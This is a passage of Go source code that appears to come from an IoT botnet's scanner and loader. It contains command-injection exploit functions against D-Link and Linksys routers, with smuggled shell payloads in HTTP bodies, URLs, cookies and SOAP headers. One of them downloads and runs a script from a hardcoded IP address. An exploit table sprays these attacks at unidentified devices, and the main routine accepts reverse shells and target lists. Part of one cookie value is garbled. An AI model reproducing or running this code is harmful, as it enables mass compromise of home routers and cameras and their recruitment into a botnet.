    conn.Write([]byte("POST /debug.cgi HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: python-requests/2.21.0\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Length: " + strconv.Itoa(cntLen) + "\r\nContent-Type: application/x-www-form-urlencoded\r\nAuthorization: Basic R2VtdGVrOmdlbXRla3N3ZA==\r\n\r\ndata1=" + linksysTwoPayload + "&command=ui_debug\r\n\r\n"))

    tmpbuf := make([]byte, 128)
    ln, err := conn.Read(tmpbuf)
    if ln <= 0 || err != nil {
        conn.Close()
    }

    zeroByte(rdbuf)
    conn.Close()
}

func infectFunctionDlinkTwo(target string) {

    var rdbuf []byte = []byte("")
 
    conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
    if err != nil {
        return
    }
 	
 	var cntLen int = 91
 	cntLen += len(dlinkTwoPayload)

    conn.Write([]byte("POST /setSystemCommand HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozila/5.0\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nContent-Length: " + strconv.Itoa(cntLen) + "\r\nAuthorization: Basic YWRtaW46\r\n\r\nReplySuccessPage=docmd.htm&ReplyErrorPage=docmd.htm&SystemCommand=" + dlinkTwoPayload + "&ConfigSystemCommand=Save\r\n\r\n"))

    tmpbuf := make([]byte, 128)
    ln, err := conn.Read(tmpbuf)
    if ln <= 0 || err != nil {
        conn.Close()
    }

    zeroByte(rdbuf)
    conn.Close()
}

func infectFunctionDlinkThree(target string) {

    var rdbuf []byte = []byte("")
 
    conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
    if err != nil {
        return
    }
 	
 	var cntLen int = 20
 	cntLen += len(dlinkTwoPayload)

    conn.Write([]byte("POST /diagnostic.php HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozila/5.0\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nContent-Length: " + strconv.Itoa(cntLen) + "\r\n\r\nact=ping&dst=%26 " + dlinkTwoPayload + "%26\r\n\r\n"))
    
    tmpbuf := make([]byte, 128)
    ln, err := conn.Read(tmpbuf)
    if ln <= 0 || err != nil {
        conn.Close()
    }

    zeroByte(rdbuf)
    conn.Close()
}

func infectFunctionDlinkFour(target string) {

    var rdbuf []byte = []byte("")
 
    conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
    if err != nil {
        return
    }
 	
    conn.Write([]byte("GET /cgi-bin/gdrive.cgi?cmd=4&f_gaccount=;" + dlinkTwoPayload +";echo%207yeB8BQB2ycGRCT8LmsmttUWPggWykhK; HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozila/5.0\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n"))
    
    tmpbuf := make([]byte, 128)
    ln, err := conn.Read(tmpbuf)
    if ln <= 0 || err != nil {
        conn.Close()
    }

    zeroByte(rdbuf)
    conn.Close()
}

func infectFunctionDlinkFive(target string) {

    var rdbuf []byte = []byte("")
 
    conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
    if err != nil {
        return
    }
 	
    conn.Write([]byte("GET /login.cgi?cli=multilingual%20show';" + dlinkTwoPayload + "'$ HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozila/5.0\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n"))
    
    tmpbuf := make([]byte, 128)
    ln, err := conn.Read(tmpbuf)
    if ln <= 0 || err != nil {
        conn.Close()
    }

    zeroByte(rdbuf)
    conn.Close()
}

func infectFunctionDlinkSix(target string) {

    var rdbuf []byte = []byte("")
 
    conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
    if err != nil {
        return
    }
 	
    conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozila/5.0\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nCookie: i=`" + dlinkTwoPayload + "`\r\n\r\n"))
    
    tmpbuf := make([]byte, 128)
    ln, err := conn.Read(tmpbuf)
    if ln <= 0 || err != nil {
        conn.Close()
    }

    zeroByte(rdbuf)
    conn.Close()
}

func infectFunctionDlinkSeven(target string) {

    var rdbuf []byte = []byte("")
 
    conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
    if err != nil {
        return
    }
 	
    conn.Write([]byte("POST /hedwig.cgi HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozila/5.0\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: uid=uAMwOEeRuqDZptt4JHrQuakNv2g3eR9kqnvDUvAkaRD561YFVty3uXFAls6bcARYA5w5KpUrDlY7pdAXuG0AuhHSfBCQJoPDqxdjszcAWwQYxOEf6Sy9t8iU4PV1xNyVxDMPqZwR7a5dthsW8jLiK0ha1qUksjWYna5IaYoOYIM7aiT3mrseuskJWVONKXFQQw64tNsAAmrfIc9OobZ4gxQibsOsHkZoqz5C1ScGYmMaWeICXuF1J2R1FIzGkXOr3OXjKXQ8C6ZeSbRRmEBF8GaJPJ87wiVlDAXj6QsyKSWDzjqTWqS9rxBnx39xwO9e02kJibbjxAW93SsX7rfKmUH4hN0H1j8dqYGhpPWL0CSELCM7NwWSjs5ofrkRivAE5bI3rnlSsMeyvPGmRjGhSH6Z5kWDAVQ5bUztFAALVyl0nPl9fl2FgmLNCPmqx9VMNMsFTnOfv4hVP9wNiN1WYTeHRCrLeB9THv1uzipH8utX2Y7Cv5iaxSMYZOUVG2puqPAYc2QzfdkEgrIOuIOZIUXQvYGF35rIkMW8eYuiVKqejKbXaM8B6RfiBTCTAHJpRMnkp5L9HorqZNwX6lpyH62slJG4iS3Yz31SrgBV5PDANkFw92G6qtT8kvbHfzoI2kyJKQa67TSDHhZLgfUHMsFFLwZTZwiXlZIzDFimYbdTaz8KWF0POFoqyGs5oynMDic8VvwS2rGsALvVHYWa885i4CIrwyEOnkY6Mqvmv96osjP1Br3GWARZPpnwGoWc7dVLvZVDLW1ObRFg1bX8qDUdxv4jcGGwZdK5wz2bJoNoyEWIkFVcQldDxjaQNdokjCmJxoEGRUGYyZshnx1fYqLH3Mc3K9DcB7xhZdbdBAohXpzYr7OXpTFHZp7THrBE1i8VvvoaF1bBXsBrasf4fwYtVUrtgPHVnlq1oN2uoO6qfLZLz49u1QxK6qBGsQG2pJa6rxYmcHEPt���*vk3aG0Vgy2692qgW�ٰ*crxdla7qucxf�ذ*qzoFOTyzL063ZRDecd /tmp;wget http://37.0.11.220/a/wget.sh;chmod 777 wget.sh;sh wget.sh selfrep.dlink;rm -rf wget.sh;\r\nContent-Length: 15\r\n\r\nL0PTJUj=NX9zke5\r\n\r\n"))
    
    tmpbuf := make([]byte, 128)
    ln, err := conn.Read(tmpbuf)
    if ln <= 0 || err != nil {
        conn.Close()
    }

    zeroByte(rdbuf)
    conn.Close()
}

func infectFunctionDlinkEight(target string) {

    var rdbuf []byte = []byte("")
 
    conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
    if err != nil {
        return
    }
 	
    conn.Write([]byte("POST /HNAP1/ HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozila/5.0\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nSOAPAction: \"http://purenetworks.com/HNAP1/GetDeviceSettings/`cd && cd tmp && export PATH=$PATH:. && " + dlinkThreePayload + "`\"\r\nContent-Length: 0\r\n\r\n"))
    
    tmpbuf := make([]byte, 128)
    ln, err := conn.Read(tmpbuf)
    if ln <= 0 || err != nil {
        conn.Close()
    }

    zeroByte(rdbuf)
    conn.Close()
}


func scannerAddExploit(name string, function interface{}) {

    exploitMap[name] = function
}

func scannerInitExploits() {

    exploitMap = make(map[string]interface{})

    scannerAddExploit("Basic realm=\"DVR\"", infectFunctionLilinDvr)
    scannerAddExploit("uc-httpd 1.0.0", infectFunctionUchttpd)
    scannerAddExploit("AuthInfo:", infectFunctionTvt)
    scannerAddExploit("CMS Web Viewer", infectFunctionMagic)
    scannerAddExploit("Server: GoAhead-Webs", infectFunctionFiberhome)
    scannerAddExploit("Server: DWS", infectFunctionVigor)
    scannerAddExploit("Basic realm=\"Broadband Router\"", infectFunctionComtrend)
    scannerAddExploit("Basic realm=\"Broadband Router\"", infectFunctionBroadcom)
    scannerAddExploit("Server: Boa/0.93.15", infectFunctionGponFiber)
    scannerAddExploit("TOTOLINK", infectFunctionTotolink)
    scannerAddExploit("Server: Boa/0.94.14", infectFunctionRealtek)
    scannerAddExploit("Basic realm=\"Server Status\"", infectFunctionHongdian)
    scannerAddExploit("Server: Http Server", infectFunctionTenda)
    scannerAddExploit(",/playzone,/", infectFunctionZyxel)
    scannerAddExploit("Linksys E", infectFunctionLinksys)

    // Exploit spray for devices we cant identify
    scannerAddExploit("HTTP/1.", infectFunctionAlcatel)
    scannerAddExploit("HTTP/1.", infectFunctionZyxelTwo)
    scannerAddExploit("HTTP/1.", infectFunctionZte)
    scannerAddExploit("HTTP/1.", infectFunctionNetgear)
    scannerAddExploit("HTTP/1.", infectFunctionNetgearTwo)
    scannerAddExploit("HTTP/1.", infectFunctionNetgearThree)
    scannerAddExploit("HTTP/1.", infectFunctionNetgearFour)
    scannerAddExploit("HTTP/1.", infectFunctionGponOG)
    scannerAddExploit("HTTP/1.", infectFunctionLinksysTwo)
    scannerAddExploit("HTTP/1.", infectFunctionLinksysThree)
    scannerAddExploit("HTTP/1.", infectFunctionDlink)
    scannerAddExploit("HTTP/1.", infectFunctionDlinkTwo)
    scannerAddExploit("HTTP/1.", infectFunctionDlinkThree)
    scannerAddExploit("HTTP/1.", infectFunctionDlinkFour)
    scannerAddExploit("HTTP/1.", infectFunctionDlinkFive)
    scannerAddExploit("HTTP/1.", infectFunctionDlinkSix)
    scannerAddExploit("HTTP/1.", infectFunctionDlinkSeven)
    scannerAddExploit("HTTP/1.", infectFunctionDlinkEight)
    
}

func httpBannerCheck(target string) {

    conn, err := net.DialTimeout("tcp", target, netTimeout * time.Second)
    if err != nil {
        workerGroup.Done()
        return
    }

    conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\n\r\n"))

    for {
        bytebuf := make([]byte, 2048)
        l, err := conn.Read(bytebuf)
        if err != nil || l <= 0 {
            zeroByte(bytebuf)
            conn.Close()
            workerGroup.Done()
            return
        }

        for key, element := range exploitMap {
            if strings.Contains(string(bytebuf), key) {
                switch function := element.(type) {
                    case func(string):
                        function(target)
                    default:
                        break
                }
            }
        }
    }

    workerGroup.Done()
    return
}

func main() {

    go func() {
    	i := 0
    	for {
    		fmt.Printf("%d's | Payload Sent: %d | Telnet Opened: %d\r\n", i, payloadSent, telShells)
    		time.Sleep(1 * time.Second)
    		i++
    	}
    } ()

    dropperMap = make(map[string]echoDropper)
    telnetLoadDroppers()
    scannerInitExploits()

    li, err := net.Listen("tcp", "0.0.0.0:" + strconv.Itoa(ucRshellPort))
	if err != nil {
		return
	}

    recvServ, err := net.Listen("tcp", "0.0.0.0:19412")
	if err != nil {
		return
	}

	go func() {
		for {
			conn, err := li.Accept()
			if err != nil {
				break
			}

			go reverseShellUchttpdLoader(conn)
		}
	} ()

	go func() {
		for {
			conn, err := recvServ.Accept()
			if err != nil {
				break
			}

			for {
				buf := make([]byte, 32)
				l, err := conn.Read(buf)
				if l <= 0 || err != nil {
					conn.Close()
					break
				}

                workerGroup.Add(1)
	    	    go httpBannerCheck(string(buf))
			}
		}
	} ()

    for {
        reader := bufio.NewReader(os.Stdin)
	    input := bufio.NewScanner(reader)

	    for input.Scan() {
            if os.Args[1] == "listen" {
                workerGroup.Add(1)
	    	    go httpBannerCheck(input.Text())
            } else {
                workerGroup.Add(1)
                go httpBannerCheck(input.Text() + ":" + os.Args[1])
            }
	    }
    }
}
